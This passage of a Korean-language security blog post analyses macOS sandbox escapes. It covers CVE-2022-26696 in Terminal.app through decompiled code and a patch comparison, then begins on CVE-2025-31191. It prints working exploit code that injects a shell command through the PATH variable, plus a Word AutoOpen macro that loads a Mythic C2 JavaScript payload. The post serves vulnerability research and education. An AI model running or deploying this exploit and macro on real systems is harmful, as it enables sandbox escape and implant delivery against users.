&#xC124;&#xC815;&#xD558;&#xBA74;, Terminal&#xC774; &#xADF8; &#xD658;&#xACBD;&#xC744; &#xADF8;&#xB300;&#xB85C; &#xBB3C;&#xB824;&#xBC1B;&#xC544; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xBC97;&#xC5B4;&#xB0A0; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC5C8;&#xC5B4;&#xC694;.</p><p>Terminal &#xB0B4;&#xBD80; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74;, <code>isRunningInInstallEnvironment()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD658;&#xACBD;&#xBCC0;&#xC218; &#xC124;&#xC815;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs bash">+(char)isRunningInInstallEnvironment {    <span class="hljs-keyword">if</span> (*(int8_t *)byte_10010617c == 0x1) {        rax = *(int8_t *)byte_10010617b;    } <span class="hljs-keyword">else</span> {        COND = getenv(<span class="hljs-string">&quot;__OSINSTALL_ENVIRONMENT&quot;</span>) != 0x0;        rax = COND_BYTE_SET(NE);        *(int8_t *)byte_10010617b = COND ? 0x1 : 0x0;        *(int8_t *)byte_10010617c = 0x1;    }    rax = sign_extend_64(rax);    <span class="hljs-built_in">return</span> rax;}</code></pre><p>&#xC774;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>__OSINSTALL_ENVIRONMENT</code>&#xB77C;&#xB294; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0;, &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xBA74; Terminal&#xC740; <strong>BaseSystem &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB41C; &#xAC83;</strong>&#xC73C;&#xB85C; &#xD310;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;.</p><p><em>* macOS &#xC124;&#xCE58; USB&#xB97C; &#xBD80;&#xD305;&#xD588;&#xC744; &#xB54C;&#xC758; &#xC124;&#xCE58; UI, macOS &#xBCF5;&#xAD6C; &#xBAA8;&#xB4DC;(Recovery Mode), BaseSystem.dmg&#xB97C; &#xB9C8;&#xC6B4;&#xD2B8;&#xD55C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xD658;&#xACBD; &#xB4F1;</em></p><pre><code class="hljs bash">-(void *)init {    var_30 = self;    *(&amp;var_30 + 0x8) = *0x1000f4790;    rax = [[&amp;var_30 super] init];    r14 = rax;    <span class="hljs-keyword">if</span> (rax != 0x0) {        <span class="hljs-keyword">if</span> (*qword_100105e38 == 0x0) {            *qword_100105e38 = r14;        }        rbx = [[[NSProcessInfo processInfo] environment] mutableCopy];        <span class="hljs-keyword">if</span> ([objc_opt_class(r14) **isRunningInInstallEnvironment**] == 0x0) {            [rbx removeObjectForKey:@<span class="hljs-string">&quot;HOME&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;USER&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;LOGNAME&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;PATH&quot;</span>];            [rbx removeObjectForKey:@<span class="hljs-string">&quot;SHELL&quot;</span>];        }</code></pre><p><code>init</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; <code>isRunningInInstallEnvironment()</code> &#xAC12;&#xC774; <code>NO</code>&#xC774;&#xBA74;, Terminal&#xC740; <code>HOME</code>, <code>PATH</code> &#xB4F1; &#xC8FC;&#xC694; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC9C0;&#xC6B0;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC694;. &#xADF8;&#xB7F0;&#xB370; &#xC774; &#xAC12;&#xC774; <code>YES</code>&#xC77C; &#xACBD;&#xC6B0;, &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB4E4;&#xC774; &#xC9C0;&#xC6CC;&#xC9C0;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xC720;&#xC9C0;&#xB429;&#xB2C8;&#xB2E4;. &#xACB0;&#xAD6D;, <code>__OSINSTALL_ENVIRONMENT=1</code> &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xD558;&#xB098;&#xB9CC; &#xC124;&#xC815;&#xD558;&#xBA74;, Terminal.app&#xC740; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC778;&#xB370;&#xC694;. &#xC774;&#xAC78; &#xC774;&#xC6A9;&#xD558;&#xBA74; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB41C; &#xC571;&#xC774; Terminal&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xC258; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;</strong>&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD65C;&#xC6A9;&#xD574;&#xC11C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC571; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xACB0;&#xACFC;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><ol><li><code>__OSINSTALL_ENVIRONMENT=1</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xC640; &#xD568;&#xAED8; Terminal.app &#xC2E4;&#xD589;</li><li><code>PATH</code> &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xC5D0; &#xC545;&#xC131; &#xBA85;&#xB839;&#xC5B4; &#xC0BD;&#xC785; &#x2192; <code>$(malicious_command)</code> &#xD615;&#xD0DC;</li><li>Terminal&#xC774; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xBC1B;&#xC544; &#xC2E4;&#xD589; </li><li>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC571;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; &#xC545;&#xC131; &#xBA85;&#xB839;&#xC5B4; &#xC2E4;&#xD589; </li></ol><pre><code class="hljs bash">void sbxWithShellCommand(NSString *<span class="hljs-built_in">command</span>) {    FSRef appFSURL;    NSString *path = @<span class="hljs-string">&quot;/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal&quot;</span>;    OSStatus stat2 = FSPathMakeRef((const UInt8 *)[path UTF8String], &amp;appFSURL, NULL);    <span class="hljs-keyword">if</span> (stat2 &lt; 0) {        NSLog(@<span class="hljs-string">&quot;Something wrong: %d&quot;</span>,stat2);    }    LSApplicationParameters appParam;    appParam.version = 0;    appParam.flags = kLSLaunchDefaults;    appParam.application = &amp;appFSURL;    appParam.argv = NULL;    // &#xC2E4;&#xD589;&#xD560; &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;    NSString *finalCommand = [NSString stringWithFormat:@<span class="hljs-string">&quot;<span class="hljs-subst">$(%@)</span>&quot;</span>, <span class="hljs-built_in">command</span>];    NSDictionary *envs = @{@<span class="hljs-string">&quot;PATH&quot;</span>:finalCommand, @<span class="hljs-string">&quot;__OSINSTALL_ENVIRONMENT&quot;</span>:@<span class="hljs-string">&quot;1&quot;</span>};    appParam.environment = (__bridge CFDictionaryRef)envs;    appParam.asyncLaunchRefCon = NULL;    appParam.initialEvent = NULL;    CFArrayRef array = (__bridge CFArrayRef)@[];    OSStatus <span class="hljs-built_in">stat</span> = **LSOpenURLsWithRole**(array, kLSRolesAll, NULL, &amp;appParam, NULL, 0);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">stat</span> &lt; 0) {        NSLog(@<span class="hljs-string">&quot;Something wrong: %d&quot;</span>, <span class="hljs-built_in">stat</span>);    }}</code></pre><p>Apple&#xC758; <a href="https://developer.apple.com/documentation/coreservices/launch_services"><strong>LaunchServices API</strong></a>&#xC778; <code>LSOpenURLsWithRole()</code>&#xC744; &#xC774;&#xC6A9;&#xD574; Terminal&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0;, &#xADF8;&#xB54C; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB85C; &#xC258; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xB118;&#xAE30;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C;, &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Microsoft Word &#xB9E4;&#xD06C;&#xB85C; &#xC548;&#xC5D0;&#xC11C;&#xB3C4; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs bash">Sub AutoOpen()MacScript (<span class="hljs-string">&quot;do shell script &quot;</span><span class="hljs-string">&quot;open -b com.apple.terminal --env __OSINSTALL_ENVIRONMENT=1 --env PATH=&apos;<span class="hljs-subst">$(/usr/bin/osascript -l JavaScript /path/.apfell.js)</span>&apos;&quot;</span><span class="hljs-string">&quot; &quot;</span>)End Sub</code></pre><p>Word &#xBB38;&#xC11C; &#xB0B4; &#xB9E4;&#xD06C;&#xB85C;&#xC5D0; &#xD3EC;&#xD568;&#xC2DC;&#xCF1C; <strong>Mythic C2&#xC758; JXA Payload</strong>&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>++ Apple&#xC740; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; CVE-2022-26696&#xC73C;&#xB85C; &#xC9C0;&#xC815;&#xD574; Terminal&#xC774; <code>__OSINSTALL_ENVIRONMENT</code> &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB97C; &#xB354; &#xC774;&#xC0C1; &#xC2E0;&#xB8B0;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC81C; &#xD130;&#xBBF8;&#xB110;(v2.14)&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xAC01; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image5.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image6.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image7.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image8.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image9.png" alt="image.png"></p><p>&#xB2E8;&#xC21C;&#xD788; &#xD658;&#xACBD;&#xBCC0;&#xC218;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xC218;&#xC900;&#xC774; &#xC544;&#xB2C8;&#xB77C;, <strong>&#xB354; &#xB2E4;&#xC591;&#xD55C; &#xBCF4;&#xC548; &#xC870;&#xAC74;&#xC744; &#xCCB4;&#xD06C;&#xD558;&#xACE0;, &#xB0B4;&#xBD80; &#xC0C1;&#xD0DC;&#xB3C4; &#xAD6C;&#xC870;&#xC801;&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;</strong>&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC5B4;&#xC694;. </p><p>&#xB2E8;&#xC21C;&#xD788; <code>__OSINSTALL_ENVIRONMENT</code> &#xC5D0; &#xC758;&#xC874;&#xD558;&#xB358; &#xAD6C;&#xC870;&#xB97C; &#xAC77;&#xC5B4;&#xB0B4;&#xACE0;, Terminal&#xC774; <strong>&#xC815;&#xC0C1;&#xC801;&#xC778; launchd &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB9CC; &#xB3D9;&#xC791;&#xD558;&#xB3C4;&#xB85D; &#xBCF4;&#xC548; &#xAE30;&#xBC18;&#xC744; &#xAC15;&#xD654;&#xD55C; &#xAC83;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xD6C4;&#xB85C;&#xB3C4; Launch Services&#xAC00; <strong>XPC &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC0C1;&#xD0DC;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xC778;&#xC2DD;&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC5B4;&#xC694;.</strong></p><p>[TTApplication init] &#xCF54;&#xB4DC;</p><pre><code class="hljs bash">TTApplication *__cdecl -[TTApplication init](TTApplication *self, SEL a2){  TTApplication *v2; // rax  TTApplication *v3; // rbx  id v4; // rax  id v5; // rax  id v6; // r14  void *v7; // rax  id v8; // rax  id v9; // rax  id v10; // rax  id v11; // rax  struct objc_super v13; // [rsp+0h] [rbp-30h] BYREF  v13.receiver = self;  v13.cls = &amp;OBJC_CLASS___TTApplication;  v2 = (TTApplication *)objc_msgSendSuper2(&amp;v13, <span class="hljs-string">&quot;init&quot;</span>);  v3 = v2;  <span class="hljs-keyword">if</span> ( v2 )                                     // rax  {    <span class="hljs-keyword">if</span> ( !qword_1000FFE38 )      qword_1000FFE38 = v2;    v4 = objc_msgSend(&amp;OBJC_CLASS___NSProcessInfo, <span class="hljs-string">&quot;processInfo&quot;</span>);    v5 = objc_msgSend(v4, <span class="hljs-string">&quot;environment&quot;</span>);    v6 = objc_msgSend(v5, <span class="hljs-string">&quot;mutableCopy&quot;</span>);    v7 = (void *)objc_opt_class(v3);    <span class="hljs-keyword">if</span> ( !(unsigned __int8)objc_msgSend(v7, <span class="hljs-string">&quot;isRunningInInstallEnvironment&quot;</span>) )    {      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFD90);// <span class="hljs-string">&quot;HOME&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDB0);// <span class="hljs-string">&quot;USER&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDD0);// <span class="hljs-string">&quot;LOGNAME&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFDF0);// <span class="hljs-string">&quot;PATH&quot;</span>      objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE10);// <span class="hljs-string">&quot;SHELL&quot;</span>      <span class="hljs-keyword">if</span> ( (unsigned int)csr_check(2LL) )        objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE30);    }    objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE50);    objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE70);    v3-&gt;_initialEnvironment = (NSDictionary *)objc_msgSend(v6, <span class="hljs-string">&quot;copy&quot;</span>);    objc_release(v6);    objc_msgSend(v3, <span class="hljs-string">&quot;setDelegate:&quot;</span>, v3);    v8 = objc_alloc(&amp;OBJC_CLASS___NSMutableIndexSet);    v3-&gt;_availableEquivalents = (NSMutableIndexSet *)objc_msgSend(v8, <span class="hljs-string">&quot;initWithIndexesInRange:&quot;</span>, 1LL, 9LL);    v3-&gt;_windowEquivalents = (NSMutableDictionary *)objc_alloc_init(&amp;OBJC_CLASS___NSMutableDictionary);    v9 = objc_msgSend(&amp;OBJC_CLASS___NSUserDefaults, <span class="hljs-string">&quot;standardUserDefaults&quot;</span>);    v10 = objc_msgSend(v9, <span class="hljs-string">&quot;objectForKey:&quot;</span>, off_1000FF878);    <span class="hljs-keyword">if</span> ( v10 )      objc_msgSend(v3, <span class="hljs-string">&quot;setDefaultShell:&quot;</span>, v10);    objc_msgSend(v3, <span class="hljs-string">&quot;addObserver:forKeyPath:options:context:&quot;</span>, v3, &amp;off_1000CFE90, 11LL, &amp;unk_1000A4548);    v11 = objc_msgSend(&amp;OBJC_CLASS___NSNotificationCenter, <span class="hljs-string">&quot;defaultCenter&quot;</span>);    objc_msgSend(      v11,      <span class="hljs-string">&quot;addObserver:selector:name:object:&quot;</span>,      v3,      <span class="hljs-string">&quot;handleWindowKeyChange:&quot;</span>,      NSWindowDidBecomeKeyNotification,      0LL);    v3-&gt;_currentWorkspace = (TTWorkspace *)objc_alloc_init(&amp;OBJC_CLASS___TTWorkspace);    objc_msgSend(&amp;OBJC_CLASS___NSColor, <span class="hljs-string">&quot;setIgnoresAlpha:&quot;</span>, 0LL);    objc_msgSend(v3, <span class="hljs-string">&quot;initLowSwapSpaceWatcher&quot;</span>);  }  <span class="hljs-built_in">return</span> v3;}</code></pre><hr><h3 id="2-2-CVE&#x2011;2025&#x2011;31191-Security&#x2011;Scoped-Bookmarks-&#xAE30;&#xBC18;-Sandbox-Escape"><a href="#2-2-CVE&#x2011;2025&#x2011;31191-Security&#x2011;Scoped-Bookmarks-&#xAE30;&#xBC18;-Sandbox-Escape" class="headerlink" title="2.2 CVE&#x2011;2025&#x2011;31191: Security&#x2011;Scoped Bookmarks &#xAE30;&#xBC18; Sandbox Escape"></a>2.2 CVE&#x2011;2025&#x2011;31191: Security&#x2011;Scoped Bookmarks &#xAE30;&#xBC18; Sandbox Escape</h3><p>CVE&#x2011;2025&#x2011;31191&#xB294; macOS&#xC5D0;&#xC11C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB41C; &#xC571;&#xC774; <strong>Security&#x2011;Scoped Bookmark</strong>&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC2B9;&#xC778; &#xC5C6;&#xC774;&#xB3C4; &#xC2DC;&#xC2A4;&#xD15C; &#xC790;&#xC6D0;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD5C8;&#xC6A9;&#xD588;&#xB358; &#xAD6C;&#xC870;&#xC801; &#xD5C8;&#xC810;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;.  </p><p>2.1&#xC5D0;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF8; CVE-2022-26696 &#xC678;&#xC5D0;&#xB3C4; &#xB2E4;&#xC591;&#xD55C; Launch Services &#xAE30;&#xBC18; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD588;&#xB294;&#xB370;&#xC694;. &#xC774;&#xD6C4; Apple&#xC740; &#xC774;&#xB7EC;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; Launch Services &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB3C4; App Sandbox &#xC815;&#xCC45;&#xC744; &#xAC15;&#xD654;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C;&#xB294; XPC &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC0C1;&#xD0DC;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xC778;&#xC2DD;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xACE0;, &#xC774;&#xB85C; &#xC778;&#xD574; <strong>CVE-2022-26706</strong>, <strong>CVE-2021-30864</strong>, <strong>CVE-2022-26696</strong> &#xAC19;&#xC740; &#xACFC;&#xAC70; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC740; &#xB354; &#xC774;&#xC0C1; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB418;&#xC5C8;&#xC8E0;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xBCC0;&#xD654;&#xB294; Microsoft Office for macOS &#xD658;&#xACBD;&#xC5D0;&#xB3C4; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Office &#xC571; &#xC5ED;&#xC2DC; macOS&#xC758; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC815;&#xCC45;&#xC744; &#xC5C4;&#xACA9;&#xD788; &#xB530;&#xB974;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC5B4;, &#xC608;&#xC804;&#xCC98;&#xB7FC; &#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC190;&#xC27D;&#xAC8C; &#xCD08;&#xAE30; &#xCE68;&#xD22C;&#xB97C; &#xC2DC;&#xB3C4;&#xD558;&#xAE30;&#xB294; &#xC5B4;&#xB824;&#xC6B4; &#xAD6C;&#xC870;&#xAC00; &#xB418;&#xC5C8;&#xC5B4;&#xC694;. &#xADF8;&#xB7EC;&#xB098;, &#xC704;&#xD611; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB0A8;&#xC544; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xC911;&#xC2EC;&#xC73C;&#xB85C; <strong>&#xD30C;&#xC77C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xD1A0;&#xD070;&#xCC98;&#xB7FC; &#xC800;&#xC7A5;&#xD574; &#xB458; &#xC218; &#xC788;&#xB294; SSB(Security&#x2011;Scoped Bookmark)</strong> &#xAE30;&#xB2A5;&#xC744; &#xC8FC;&#xC694; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC0BC;&#xC544; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>Security&#x2011;Scoped Bookmark?</strong></p></blockquote><p>macOS&#xB294; &#xBCF4;&#xC548;&#xC744; &#xC704;&#xD574; &#xC571;&#xC758; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC81C;&#xD55C;&#xD558;&#xACE0; &#xC788;&#xACE0;, &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xBA85;&#xC2DC;&#xC801;&#xC778; &#xC2B9;&#xC778;&#xC774; &#xC5C6;&#xC774;&#xB294; &#xC678;&#xBD80; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; &#xC774;&#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB300;&#xD45C;&#xC801;&#xC778; &#xAE30;&#xB2A5; &#xC911; &#xD558;&#xB098;&#xAC00; &#xBC14;&#xB85C; <strong>Security&#x2011;Scoped Bookmark</strong>&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774; Bookmark&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD2B9;&#xC815; &#xD30C;&#xC77C;&#xC774;&#xB098; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xC744; &#xC2B9;&#xC778;&#xD558;&#xBA74;, &#xD574;&#xB2F9; &#xC790;&#xC6D0;&#xC5D0; &#xB300;&#xD55C; <strong>&#xC811;&#xADFC; &#xAD8C;&#xD55C;</strong>&#xC744; &#xD1A0;&#xD070;&#xCC98;&#xB7FC; &#xC800;&#xC7A5;&#xD574; &#xB458; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC918;&#xC694;. &#xC571;&#xC740; &#xC774; Bookmark&#xB97C; &#xC800;&#xC7A5;&#xD574;&#xB450;&#xC5C8;&#xB2E4;&#xAC00; &#xB098;&#xC911;&#xC5D0; &#xB2E4;&#xC2DC; &#xC0AC;&#xC6A9;&#xD574;&#xB3C4; &#xC0AC;&#xC6A9;&#xC790; &#xC2B9;&#xC778;&#xC744; &#xB2E4;&#xC2DC; &#xBC1B;&#xC9C0; &#xC54A;&#xACE0; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>macOS&#xC6A9; Office &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC704; &#xAE30;&#xB2A5;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xB450; &#xAC00;&#xC9C0; &#xC8FC;&#xC694; VBA API&#xAC00; &#xC0C8;&#xB86D;&#xAC8C; &#xB3C4;&#xC785;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>AppleScriptTask</strong></p><p>  &#xB9E4;&#xD06C;&#xB85C;&#xAC00; &#xBBF8;&#xB9AC; &#xC9C0;&#xC815;&#xB41C; AppleScript&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; API&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; <code>~/Library/Application Scripts/[&#xBC88;&#xB4E4; ID]/</code> &#xACBD;&#xB85C;&#xC5D0; &#xC874;&#xC7AC;&#xD574;&#xC57C; &#xD558;&#xBA70;, Office &#xC571; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC774; &#xACBD;&#xB85C;&#xC5D0; &#xC811;&#xADFC;&#xD574; &#xD30C;&#xC77C;&#xC744; &#xC791;&#xC131;&#xD560; &#xC218; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; escape &#xC5D0;&#xB294; &#xD65C;&#xC6A9;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6E0;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>GrantAccessToMultipleFiles</strong></p><p>  &#xC774; API&#xB294; &#xB9E4;&#xD06C;&#xB85C; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC5EC;&#xB7EC; &#xD30C;&#xC77C;&#xC744; &#xC120;&#xD0DD;&#xD574; &#xC2B9;&#xC778;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD55C; &#xB4A4;, &#xADF8; &#xD30C;&#xC77C;&#xB4E4;&#xC5D0; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80;&#xC5D0;&#xC11C;&#xB3C4; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; &#xAE30;&#xB2A5;&#xC774;&#xC5D0;&#xC694;. &#xD2B9;&#xD788; &#xB300;&#xC6A9;&#xB7C9; &#xC791;&#xC5C5;&#xC5D0;&#xC11C; &#xC720;&#xC6A9;&#xD558;&#xAC8C; &#xC4F0;&#xC77C; &#xC218; &#xC788;&#xC8E0;.</p></li></ul><p>&#xC774; &#xC911; <code>AppleScriptTask</code>&#xB294; &#xBCF4;&#xC548;&#xC801;&#xC73C;&#xB85C; &#xD070; &#xBB38;&#xC81C;&#xAC00; &#xC5C6;&#xC5B4; &#xBCF4;&#xC600;&#xAE30;&#xC5D0;, <code>GrantAccessToMultipleFiles</code> API&#xB97C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xBCF8;&#xACA9;&#xC801;&#xC778; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD588;&#xC5B4;&#xC694;.</p><blockquote><p><strong>SSB &#xC545;&#xC6A9;</strong></p></blockquote><p><code>GrantAccessToMultipleFiles</code> API&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xACE0; &#xC2B9;&#xC778;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; 